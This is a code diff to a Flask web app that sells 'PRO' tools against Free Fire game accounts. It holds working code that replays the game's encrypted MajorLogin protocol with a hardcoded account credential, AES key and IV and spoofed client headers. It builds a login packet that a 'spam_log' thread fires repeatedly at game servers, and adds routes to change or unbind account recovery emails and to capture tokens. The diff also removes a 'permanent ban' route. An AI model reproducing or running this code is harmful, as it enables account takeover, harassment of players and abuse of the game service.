+    is_pro = data.get('is_pro', False)
+    
+    if not username:
+        return jsonify({'success': False, 'error': 'Thiếu username'})
+    
+    user_data = firebase_get(f'/users/{username}')
+    if not user_data:
+        return jsonify({'success': False, 'error': 'Không tìm thấy người dùng'})
+    
+    firebase_update(f'/users/{username}', {'is_pro': is_pro})
+    firebase_update(f'/usage/{username}', {'is_pro': is_pro})
+    
+    if not is_pro:
+        firebase_set(f'/user_pro_tools/{username}', None)
+    
+    status = "PRO" if is_pro else "FREE"
+    return jsonify({
+        'success': True, 
+        'message': f'Đã chuyển {username} sang gói {status}',
+        'is_pro': is_pro
+    })
+
+# ============ CÁC ROUTE CŨ ============
 @app.route('/api/activate_key', methods=['POST'])
 def activate_key():
     try:
@@ -1213,17 +1125,21 @@ def admin_login2():
     if request.method == 'POST':
         username = request.form.get('username', '').strip()
         password = request.form.get('password', '')
+        
         if username == ADMIN_USERNAME and hashlib.sha256(password.encode()).hexdigest() == ADMIN_PASSWORD_HASH:
             session['admin_authenticated'] = True
             session['admin_username'] = username
             return redirect('/dashboard')
+        
         return render_template('admin_login.html', error="Tên đăng nhập hoặc mật khẩu không đúng")
+    
     return render_template('admin_login.html')
 
 @app.route('/dashboard')
 def dashboard():
     if not session.get('admin_authenticated') and not session.get('admin_logged_in'):
         return redirect('/admin/login')
+    
     admin_username = session.get('admin_username', 'Admin')
     return render_template('dashboard.html', admin_username=admin_username)
 
@@ -1398,6 +1314,7 @@ def get_task_status(task_id):
     try:
         with open('tasks.json', 'r') as f:
             tasks = json.load(f)
+        
         for task in tasks:
             if task.get('task_id') == task_id:
                 return task
@@ -1541,8 +1458,10 @@ def admin_stats():
         total_users = len(users)
         pro_users = sum(1 for u in users.values() if u.get('is_pro', False))
         usage = load_usage()
+        
         total_ban7 = sum(u.get('ban7', 0) for u in usage.values())
         total_spam_log = sum(u.get('spam_log', 0) for u in usage.values())
+        
         visits = firebase_get('visits')
         today = datetime.now().strftime('%Y-%m-%d')
         visits_today = visits.get(today, 0) if visits else 0
@@ -1569,6 +1488,7 @@ def admin_users():
         
         usage = load_usage()
         users = load_users()
+        
         users_list = []
         for uname, udata in users.items():
             uusage = usage.get(uname, {'ban7': 0, 'spam_log': 0, 'is_pro': False})
@@ -1581,6 +1501,7 @@ def admin_users():
                 'ban7_usage': uusage.get('ban7', 0),
                 'spam_log_usage': uusage.get('spam_log', 0)
             })
+        
         return jsonify({'success': True, 'users': users_list})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
@@ -1596,8 +1517,10 @@ def admin_user(username):
         if request.method == 'GET':
             if username not in users:
                 return jsonify({'success': False, 'error': 'User not found'})
+            
             usage = load_usage()
             uusage = usage.get(username, {'ban7': 0, 'spam_log': 0, 'is_pro': False})
+            
             return jsonify({
                 'success': True,
                 'user': {
@@ -1639,10 +1562,12 @@ def admin_user(username):
             
             del users[username]
             save_users(users)
+            
             usage = load_usage()
             if username in usage:
                 del usage[username]
                 save_usage(usage)
+            
             return jsonify({'success': True, 'message': 'User deleted successfully'})
     
     except Exception as e:
@@ -1719,6 +1644,7 @@ def get_lookup_token_info(region: str):
     
     account = "uid=5206080075&password=EBBDA2E490024A422713FE41114EA0FE4DB3C2EB5AF95B474B34BD7AC787CB27"
     access_token, _ = get_lookup_access_token(account)
+    
     open_id, platform = inspect_token(access_token)
     
     url = "https://loginbp.ggpolarbear.com/MajorLogin"
@@ -1747,6 +1673,7 @@ def get_lookup_token_info(region: str):
         if token:
             if isinstance(token, bytes): token = token.decode('utf-8', 'ignore')
             jwt_token = token
+            
             host = parsed.get(10)
             if isinstance(host, list): host = host[0]
             if isinstance(host, bytes): host = host.decode('utf-8', 'ignore')
@@ -1778,8 +1705,10 @@ def lookup_account():
 
         req = main_pb2.GetPlayerPersonalShow()
         json_format.ParseDict({'a': int(uid_str), 'b': 7}, req)
+        
         proto_bytes = req.SerializeToString()
         data_enc = aes_encrypt(proto_bytes)
+        
         token, server = get_lookup_token_info(region)
         
         if not server or server == "0":
@@ -1809,6 +1738,7 @@ def lookup_account():
         info_pb = AccountPersonalShow_pb2.AccountPersonalShowInfo()
         info_pb.ParseFromString(resp.content)
         data_dict = json_format.MessageToDict(info_pb)
+        
         return jsonify({'success': True, 'data': data_dict})
 
     except Exception as e:
@@ -1845,7 +1775,7 @@ def check_recovery_email():
             return jsonify({'success': False, 'error': f'API Error: {resp.status_code}'})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
-        
+
 @app.route('/api/check_platforms', methods=['POST'])
 def check_platforms():
     try:
@@ -1979,6 +1909,7 @@ def eat_to_jwt_api():
         
         open_id, platform = inspect_token(access)
         jwt, _, _ = do_major_login(open_id, access, platform)
+        
         dec = decode_jwt(jwt)
         return jsonify({
             'success': True,
@@ -2001,6 +1932,7 @@ def access_to_jwt_api():
         
         open_id, platform = inspect_token(access_token)
         jwt, _, _ = do_major_login(open_id, access_token, platform)
+        
         dec = decode_jwt(jwt)
         return jsonify({
             'success': True,
@@ -2033,6 +1965,7 @@ def add_recovery_email():
             vr = verify_otp(otp, email, access_token)
             if vr.status_code != 200:
                 return jsonify({'success': False, 'error': 'OTP verification failed'})
+            
             verifier_token = vr.json().get("verifier_token")
             if not verifier_token:
                 return jsonify({'success': False, 'error': 'No verifier token'})
@@ -2067,15 +2000,20 @@ def spam_log():
         data = request.json
         action = data.get('action', 'start')
 
-        # Kiểm tra PRO
-        is_pro = check_tool_pro(username, 'spam_log')
-        if not is_pro:
-            return jsonify({
-                'success': False,
-                'error': 'Tính năng này yêu cầu quyền hạn PRO! Vui lòng nâng cấp tài khoản.'
-            })
+        return jsonify({
+            'success': False,
+            'error': 'Tính năng này đang bảo trì, vui lòng quay lại sau!'
+        })
 
         if action == 'start':
+            is_pro = check_tool_pro(username, 'spam_log')
+
+            if not is_pro:
+                return jsonify({
+                    'success': False,
+                    'error': 'Tính năng này yêu cầu quyền hạn PRO! Vui lòng nâng cấp tài khoản.'
+                })
+
             access_token = data.get('access_token')
             interval = int(data.get('interval', 500))
             duration_ms = int(data.get('duration_ms', 10000))
@@ -2083,7 +2021,6 @@ def spam_log():
             if not access_token:
                 return jsonify({'success': False, 'error': 'Vui lòng cung cấp Access Token'})
 
-            # Check if already running
             if username in active_spams and active_spams[username]['status'] == 'running':
                 s = active_spams[username]
                 return jsonify({
@@ -2098,11 +2035,100 @@ def spam_log():
                 })
 
             try:
-                open_id, platform = spam_inspect_token(access_token)
+                open_id, platform = inspect_token(access_token)
                 
-                jwt_token, key, iv, timestamp, server_url, payload_bytes = spam_major_login(open_id, access_token, platform)
-                online_ip, online_port, whisper_ip, whisper_port = spam_get_login_data(server_url, payload_bytes, jwt_token)
-                packet = spam_build_login_packet(jwt_token, key, iv, timestamp)
+                jwt = None
+                m_key, m_iv = None, None
+                platforms_to_try = [platform] + [p for p in [2, 3, 4, 6, 8] if p != platform]
+                for pt in platforms_to_try:
+                    try:
+                        key, iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'
+                        
+                        pl = bytearray()
+                        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                        pl.extend(SimpleProtobuf.encode_string(3, now))
+                        pl.extend(SimpleProtobuf.encode_string(22, open_id))
+                        pl.extend(SimpleProtobuf.encode_string(23, str(pt)))
+                        pl.extend(SimpleProtobuf.encode_string(29, access_token))
+                        pl.extend(SimpleProtobuf.encode_string(99, str(pt)))
+                        pb_payload = bytes(pl)
+                        
+                        enc_payload = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(pb_payload, 16))
+
+                        headers = {
+                            'X-Unity-Version': '2018.4.11f1', 'ReleaseVersion': 'OB53',
+                            'Content-Type': 'application/x-www-form-urlencoded', 'X-GA': 'v1 1',
+                            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/QKQ1.190825.002)',
+                            'Host': 'loginbp.ggpolarbear.com',
+                            'Connection': 'Keep-Alive'
+                        }
+
+                        r1 = requests.post(
+                            "https://loginbp.ggpolarbear.com/MajorLogin",
+                            headers=headers,
+                            data=enc_payload,
+                            timeout=10,
+                            verify=False
+                        )
+
+                        if r1.status_code == 200:
+                            resp_pb = MajorLogin_res_pb2.MajorLoginRes()
+                            try:
+                                dec = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(r1.content), 16)
+                                resp_pb.ParseFromString(dec)
+                                jwt = resp_pb.account_jwt or resp_pb.token
+                                m_key, m_iv = resp_pb.key, resp_pb.iv
+                                if jwt: break
+                            except:
+                                try:
+                                    resp_pb.ParseFromString(r1.content)
+                                    jwt = resp_pb.account_jwt or resp_pb.token
+                                    m_key, m_iv = resp_pb.key, resp_pb.iv
+                                    if jwt: break
+                                except: pass
+                    except: pass
+                
+                if not jwt:
+                    return jsonify({'success': False, 'error': 'Đăng nhập MajorLogin thất bại sau nhiều lần thử'})
+
+                gld_headers = {
+                    "Host": "clientbp.ggpolarbear.com",
+                    "Authorization": f"Bearer {jwt}",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "User-Agent": "FreeFire/2.103.1 (iPhone; iOS 15.5; Scale/3.00)",
+                    "X-GA": "v1 1",
+                    "ReleaseVersion": "OB53",
+                    "Connection": "keep-alive"
+                }
+                
+                r2 = requests.post(
+                    "https://clientbp.ggpolarbear.com/GetLoginData",
+                    headers=gld_headers,
+                    data=enc_payload,
+                    timeout=12,
+                    verify=False
+                )
+
+                room_info = get_available_room_spam(r2.content.hex())
+                addr = room_info.get('14', {}).get('data')
+                if not addr:
+                    return jsonify({'success': False, 'error': 'Không thể lấy địa chỉ máy chủ'})
+
+                online_ip = addr[:-6]
+                online_port = int(addr[-5:])
+
+                jwt_parts = jwt.split('.')
+                jwt_payload = json.loads(base64.urlsafe_b64decode(jwt_parts[1] + "==").decode())
+                acc_id = int(jwt_payload.get("account_id", 0))
+                exp_adj = max(int(jwt_payload.get("exp", 0)) - 28800, 0)
+
+                cipher_jwt = AES.new(m_key, AES.MODE_CBC, m_iv)
+                enc_jwt = cipher_jwt.encrypt(pad(jwt.encode(), 16))
+                final_packet = bytes.fromhex(
+                    "0115" + acc_id.to_bytes(8, "big").hex() +
+                    exp_adj.to_bytes(4, "big").hex() +
+                    len(enc_jwt).to_bytes(4, "big").hex()
+                ) + enc_jwt
 
                 end_time = time.time() + (duration_ms / 1000.0)
                 stop_event = threading.Event()
@@ -2117,14 +2143,14 @@ def spam_log():
                     'ip': online_ip,
                     'port': online_port,
                     'end_time': end_time,
-                    'packet': packet,
+                    'packet': final_packet,
                     'interval': interval,
                     'total_ms': duration_ms
                 }
 
                 thread = threading.Thread(
                     target=spam_loop,
-                    args=(username, online_ip, online_port, packet, interval, end_time, stop_event)
+                    args=(username, online_ip, online_port, final_packet, interval, end_time, stop_event)
                 )
                 thread.daemon = True
                 thread.start()
@@ -2175,7 +2201,6 @@ def spam_status():
 
         username = session.get('username')
 
-        # Check cache for resurrection if server crashed
         if username not in active_spams:
             cache = load_spam_cache()
             c_item = cache.get(str(username))
@@ -2237,7 +2262,11 @@ def task_status(task_id):
         task = get_task_status(task_id)
         if not task:
             return jsonify({'success': False, 'error': 'Không tìm thấy tác vụ'})
-        return jsonify({'success': True, 'task': task})
+        
+        return jsonify({
+            'success': True,
+            'task': task
+        })
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
@@ -2284,6 +2313,7 @@ def long_bio():
         pl += _int_field(9, 1)
         pl += _str_field(11, b'')
         pl += _str_field(12, b'')
+        
         enc = aes_encrypt(bytes(pl))
         
         headers = {
@@ -2324,6 +2354,7 @@ def send_otp_add_recovery():
             return jsonify({'success': False, 'error': 'Email và Access Token là bắt buộc'})
         
         resp = send_otp(email, access_token)
+        
         if not resp:
             return jsonify({'success': False, 'error': 'Không thể kết nối đến máy chủ Garena'})
 
@@ -2380,6 +2411,7 @@ def send_otp_unbind():
             return jsonify({'success': False, 'error': 'Email và Access Token là bắt buộc'})
         
         resp = send_otp(email, access_token)
+        
         if not resp:
             return jsonify({'success': False, 'error': 'Không thể kết nối đến máy chủ Garena'})
             
@@ -2407,6 +2439,7 @@ def send_otp_change_old():
             return jsonify({'success': False, 'error': 'Email cũ và Access Token là bắt buộc'})
         
         resp = send_otp(old_email, access_token)
+        
         if not resp:
             return jsonify({'success': False, 'error': 'Không thể kết nối đến máy chủ Garena'})
 
@@ -2433,6 +2466,7 @@ def send_otp_change_new():
             return jsonify({'success': False, 'error': 'Email mới và Access Token là bắt buộc'})
         
         resp = send_otp(new_email, access_token)
+        
         if not resp:
             return jsonify({'success': False, 'error': 'Không thể kết nối đến máy chủ Garena'})
         
@@ -2569,48 +2603,6 @@ def change_bind_email():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-@app.route('/api/ban_vinh_vien', methods=['POST'])
-def ban_vinh_vien():
-    try:
-        if 'authenticated' not in session or not session['authenticated']:
-            return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})
-
-        username = session.get('username')
-        is_pro = check_tool_pro(username, 'ban7')
-
-        if not is_pro:
-            return jsonify({
-                'success': False,
-                'error': 'Tính năng này yêu cầu quyền hạn PRO! Vui lòng nâng cấp tài khoản.'
-            })
-
-        data = request.json
-        access_token = data.get('access_token')
-        
-        if not access_token:
-            return jsonify({'success': False, 'error': 'Access token là bắt buộc'})
-
-        client = FreeFireLogin()
-        result = client.login(access_token)
-        
-        if result.get("status"):
-            info = result.get("data", {})
-            update_user_usage(username, 'ban7')
-            return jsonify({
-                'success': True,
-                'message': 'Ban Vĩnh Viễn thành công!',
-                'data': {
-                    'uid': info.get('uid'),
-                    'nickname': info.get('nickname'),
-                    'region': info.get('region')
-                }
-            })
-        else:
-            return jsonify({'success': False, 'error': result.get('message', 'Ban thất bại')})
-
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-        
 @app.route('/auth')
 def auth_page():
     return render_template('auth.html')
@@ -2631,6 +2623,7 @@ def login():
             return jsonify({'success': False, 'error': 'Tên đăng nhập/email và mật khẩu là bắt buộc'})
         
         hashed_password = hashlib.sha256(password.encode('utf-8')).hexdigest()
+        
         users = firebase_get('/users')
         if not users:
             users = {}
@@ -2648,6 +2641,14 @@ def login():
         
         if user.get('password') != hashed_password:
             return jsonify({'success': False, 'error': 'Tên đăng nhập/email hoặc mật khẩu không đúng'})
+        
+        # KIỂM TRA BỊ BAN
+        if user.get('is_banned', False):
+            return jsonify({
+                'success': False, 
+                'error': f'🚫 Tài khoản đã bị khóa!\nLý do: {user.get("ban_reason", "Vi phạm điều khoản")}',
+                'banned': True
+            })
         
         session['username'] = username
         session['authenticated'] = True
@@ -2708,7 +2709,8 @@ def register():
             'email': email,
             'password': hashed_password,
             'created_at': datetime.now().isoformat(),
-            'is_pro': False
+            'is_pro': False,
+            'is_banned': False
         }
         firebase_set(f'/users/{username}', user_data)
         usage_data = {
@@ -2717,6 +2719,7 @@ def register():
             'is_pro': False
         }
         firebase_set(f'/usage/{username}', usage_data)
+        
         return jsonify({'success': True, 'message': 'Đăng ký thành công'})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
@@ -2726,15 +2729,33 @@ def check_auth():
     try:
         if session.get('authenticated') and session.get('username'):
             username = session.get('username')
-            usage = firebase_get(f'/usage/{username}')
             user = firebase_get(f'/users/{username}')
+            
+            # Kiểm tra tài khoản bị ban
+            if user and user.get('is_banned', False):
+                session.clear()
+                response = jsonify({
+                    'authenticated': False,
+                    'banned': True,
+                    'reason': user.get('ban_reason', 'Tài khoản đã bị khóa')
+                })
+                response.set_cookie('remember_token', '', expires=0)
+                return response
+            
+            usage = firebase_get(f'/usage/{username}')
             if not usage:
                 usage = {'ban7': 0, 'spam_log': 0, 'is_pro': False}
 
             usage['ban7_pro'] = check_tool_pro(username, 'ban7')
             usage['spam_log_pro'] = check_tool_pro(username, 'spam_log')
+            usage['is_banned'] = user.get('is_banned', False) if user else False
 
-            return jsonify({'authenticated': True, 'username': username, 'email': user.get('email') if user else '', 'usage': usage})
+            return jsonify({
+                'authenticated': True,
+                'username': username,
+                'email': user.get('email') if user else '',
+                'usage': usage
+            })
 
         remember_token = request.cookies.get('remember_token')
         if remember_token:
@@ -2743,15 +2764,33 @@ def check_auth():
                 users = {}
             for username, user_data in users.items():
                 if user_data.get('remember_token') == remember_token:
+                    # Kiểm tra bị ban
+                    if user_data.get('is_banned', False):
+                        response = jsonify({
+                            'authenticated': False,
+                            'banned': True,
+                            'reason': user_data.get('ban_reason', 'Tài khoản đã bị khóa')
+                        })
+                        response.set_cookie('remember_token', '', expires=0)
+                        return response
+                    
                     session['username'] = username
                     session['authenticated'] = True
                     session['email'] = user_data.get('email')
                     usage = firebase_get(f'/usage/{username}')
                     if not usage:
                         usage = {'ban7': 0, 'spam_log': 0, 'is_pro': False}
+
                     usage['ban7_pro'] = check_tool_pro(username, 'ban7')
                     usage['spam_log_pro'] = check_tool_pro(username, 'spam_log')
-                    return jsonify({'authenticated': True, 'username': username, 'email': user_data.get('email'), 'usage': usage})
+                    usage['is_banned'] = user_data.get('is_banned', False)
+
+                    return jsonify({
+                        'authenticated': True,
+                        'username': username,
+                        'email': user_data.get('email'),
+                        'usage': usage
+                    })
         
         return jsonify({'authenticated': False})
     except Exception as e:
@@ -2761,11 +2800,15 @@ def check_auth():
 def logout():
     try:
         username = session.get('username')
+        
         if username:
             firebase_update(f'/users/{username}', {'remember_token': None})
+        
         session.clear()
+        
         response = jsonify({'success': True, 'message': 'Đăng xuất thành công'})
         response.set_cookie('remember_token', '', expires=0)
+        
         return response
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
@@ -2820,6 +2863,7 @@ def check_token_capture():
     state = request.args.get('state')
     if not state:
         return jsonify({'success': False, 'error': 'Missing state'})
+        
     try:
         data = firebase_get(f'/temp_tokens/{state}')
         if data:
